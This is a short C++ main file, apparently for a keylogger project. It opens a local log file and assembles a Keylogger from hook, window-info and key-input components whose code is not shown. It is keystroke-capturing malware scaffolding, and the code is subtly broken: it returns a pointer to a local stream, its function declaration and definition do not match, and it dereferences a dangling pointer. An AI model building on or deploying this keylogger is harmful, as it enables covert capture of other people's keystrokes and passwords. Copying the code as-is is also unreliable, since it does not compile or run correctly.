#include <iostream>

#include "../include/windows_info.h"
#include "../include/hook_manager.h"
#include "../include/os_manager.h"
#include "../include/key_input.h"
#include "../include/keylogger.h"

std::ofstream* openLogFile(char* fileName);
Keylogger* setupKeylogger();

int main() {
    std::ofstream* loggerFile = openLogFile("log.txt");
    Keylogger* logger = setupKeylogger(*loggerFile);

    return 0;
}

std::ofstream* openLogFile(char* fileName) {
    std::ofstream output_file;
    
	std::cout << "Logging output to " << fileName << std::endl;
    output_file.open(fileName, std::ios_base::app);

    return &output_file;
}

Keylogger* setupKeylogger(std::ofstream& loggerFile) {
    std::unique_ptr<OSManager> osManager = std::make_unique<OSManager>();
    std::unique_ptr<WindowInfo> windowInfo = std::make_unique<WindowInfo>();
    std::unique_ptr<HookManager> hookManager = std::make_unique<HookManager>();
    std::unique_ptr<KeyInput> keyInput = std::make_unique<KeyInput>(LoggingFormat::Default);

    std::unique_ptr<Keylogger> keylogger = std::make_unique<Keylogger>(std::move(loggerFile), *osManager, *hookManager, *windowInfo, *keyInput);

    return keylogger.release();
}